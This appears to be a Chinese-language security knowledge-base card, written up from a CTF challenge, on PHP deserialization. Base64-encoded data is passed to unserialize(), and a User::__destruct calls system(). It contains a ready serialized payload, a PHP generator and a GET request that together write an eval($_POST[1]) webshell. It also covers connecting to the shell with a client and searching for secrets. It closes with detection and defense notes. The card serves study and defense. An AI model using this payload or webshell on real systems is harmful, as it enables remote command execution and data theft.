---
id: web-php-deserialization-destruct-system-webshell-base64
title: PHP 反序列化 __destruct 直连 system：base64 编码的 data 参数触发命令执行并写 eval WebShell
type: scenario
domain: web
path: web/php/deserialization
technique: php-unserialize-destruct-system-webshell
tags:
- php
- deserialization
- pop-chain
- destruct
- system
- webshell
- base64
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V223
  verified_at: '2026-11-07T06:32:53+08:00'
  notes: 已对照原文13张图逐张核对：图08 api.php sync_user_data 分支 base64_decode([data])→file_put_contents日志→unserialize→instanceof User，图09蚁剑连接2.php密码1成功，图10 flag.enc，图11 openssl AES-256-CBC解密脚本，图12 config.php密钥，图13 flag{PHP_serialize_attack}均与卡一致；序列化payload长度s:40与command字符串一致。未验证点：PoC未本机复跑；原文未明确说明api.php是否需登录（卡中按代码片段写为不要求登录/低权限，原文未直接验证）；frontmatter无 sources/source_url；无版本；属CTF题目环境。
url: /docs/web/php/deserialization/web-php-deserialization-destruct-system-webshell-base64/
draft: false
kb_aliases:
- User::__destruct system
- api.php unserialize
- base64 data 反序列化
- 析构函数命令执行
- 反序列化写 eval webshell
---

## 一句话结论

当接口把 Base64 解码后的用户数据直接 `unserialize()`，而可用类 `User` 的 `__destruct()` 中执行 `system($this->command)` 时，攻击者只需提交一个带 `command` 属性的序列化对象：反序列化在请求结束时自动触发析构，`system()` 执行任意命令，把 `<?php eval($_POST[1]); ?>` 写入 Web 目录即可获得 WebShell。Base64 只是传输编码，不构成任何防护。

## 原理

- **反序列化还原攻击者对象**：`unserialize()` 会按序列化串中的类名和属性重建对象，属性值完全由攻击者控制；若类在业务代码中已定义/自动加载，攻击者不需要目标显式调用任何方法。
- **析构函数是自动触发点**：PHP 对象在请求结束、引用计数归零时调用 `__destruct()`。若析构函数直接使用某个属性作为命令参数（如 `system($this->command)`），该属性就成为命令注入 sink。
- **无需多级 POP 链**：本例的利用链只有“`unserialize()` → `User::__destruct()` → `system()`”一跳；不像复杂 POP 链需要 `__toString`/`__get`/`__call` 串联，因此只要入口和类存在即可稳定触发。
- **Base64 入口**：`api.php` 的 `sync_user_data` 分支先 `base64_decode($_GET['data'])`，把结果写入日志后再 `unserialize($UserData)`；Base64 仅用于让二进制/特殊字符安全通过 GET 参数，解码后仍是攻击者完全控制的序列化串。
- **写 WebShell**：命令中使用 shell 重定向 `echo '<?php eval($_POST[1]); ?>' > 2.php`，把一句话木马写入当前工作目录（通常是 Web 根目录）；若目录不可写，可改为写入其他可写且可访问的路径。

## 触发条件

- 应用存在把用户输入（直接或 Base64/URL 解码后）传入 `unserialize()` 的入口；本例为 `api.php` 的 `sync_user_data` 动作。
- 可用类中存在自动触发的魔术方法（`__destruct` 最常见），且方法内把可控属性传给 `system`/`exec`/`shell_exec`/`eval` 等 sink。
- 没有类白名单、签名校验或完整性校验；入口不要求登录或低权限即可访问。
- Web 进程对目标目录有写权限，或至少有可写且 Web 可访问的目录用于落 WebShell。

## 利用步骤

1. 审计入口源码，定位 `unserialize()` 调用及其参数来源；本例 `$UserData = base64_decode($_GET['data']); ... $User = unserialize($UserData);`。
2. 枚举可用类，找到带 `__destruct()` 且内部执行命令的类（本例 `User`），确认可控属性名（`command`）及序列化格式（public/protected/private 属性名不同）。
3. 按类定义构造序列化对象：设置 `command` 为写 WebShell 的命令，其余属性填合法/任意值；序列化后做 Base64 编码。
4. 将 Base64 串作为 `data` 参数请求 `api.php`（`action=sync_user_data` 或目标实际动作名）；请求结束时对象析构，命令执行。
5. 访问写入的 `2.php`，用蚁剑/菜刀等客户端以密码 `1` 连接，验证 `eval($_POST[1])` 可执行任意 PHP。
6. 后续在 Web 目录中查找敏感文件、配置与密钥，完成数据提取。

## PoC

序列化 payload（原文样本；属性名与类定义需按目标调整）：

```text
O:4:"User":8:{s:2:"id";s:3:"123";s:8:"username";s:4:"tset";s:5:"email";s:11:"123@123.com";s:4:"role";s:8:"customer";s:10:"created_at";N;s:7:"profile";N;s:7:"command";s:40:"echo '<?php eval($_POST[1]); ?>' > 2.php";s:7:"logFile";N;}
```

生成与提交：

```php
// 按目标类定义生成，避免手写长度错误
$u = new User();
$u->id = "123";
$u->username = "tset";
$u->email = "123@123.com";
$u->role = "customer";
$u->created_at = null;
$u->profile = null;
$u->command = "echo '<?php eval(\$_POST[1]); ?>' > 2.php";
$u->logFile = null;
echo base64_encode(serialize($u));
```

```text
GET /api.php?action=sync_user_data&data=<base64> HTTP/1.1
Host: target
```

说明：原文通过该 payload 成功写入 `2.php` 并用蚁剑连接；随后在服务器上发现加密的 `flag.enc` 与解密脚本，从 `config.php` 取得 AES 密钥后解出 flag。本条链的核心是反序列化直接命令执行，文件解密属于拿到 WebShell 后的后续步骤。

## 变体与关联

- **同一触发点、不同 sink**：[[web-php-deserialization-pop-filelogger-webshell]] 也是 `unserialize()` + `__destruct`，但 sink 是 `FileLogger::write` 写文件；本卡是析构函数直接 `system()`，链更短。
- **多级魔术方法链**：[[web-php-deserialization-magic-chain-eval-wakeup-bypass]] 覆盖 `__destruct → __toString → __get → __call → eval` 的复杂链与 `__wakeup` 属性数绕过；本卡不需要多级链，适合目标类只有单个析构 sink 的情况。
- **私有属性构造**：[[web-php-deserialization-reflection-private-property-payload]] 展示用 `ReflectionClass` 处理 private/protected 属性的 payload 生成方式。
- **入口变体**：除 GET Base64 外，`unserialize()` 也可能出现在 Cookie、POST 字段、缓存、Phar 元数据中；只要能把序列化串送入入口即可复现。
- **边界**：目标使用 `json_decode`/白名单/签名校验、类未自动加载、或 Web 目录不可写时，本链不成立；需要另找可用类或写文件路径。

## 检测与防御

- 防御：不要对用户输入调用 `unserialize()`，改用 `json_decode()` 等无对象注入风险的格式；必须使用时做类白名单与属性白名单。
- 防御：禁止在 `__destruct`/`__wakeup` 等魔术方法中执行命令或文件操作；对 `system`/`exec`/`eval` 等 sink 做审计与禁用。
- 检测：请求参数中出现 Base64 编码的 `O:`/`a:` 序列化串；`data` 等参数解码后含类名与 `command`/`system` 关键字；Web 目录出现新增 PHP 文件（尤其内容为 `eval($_POST[...])`）。
- 响应：删除恶意 WebShell、排查同入口是否被批量利用、轮换应用密钥并检查配置泄露、审计日志中 `sync_user_data` 的异常调用。
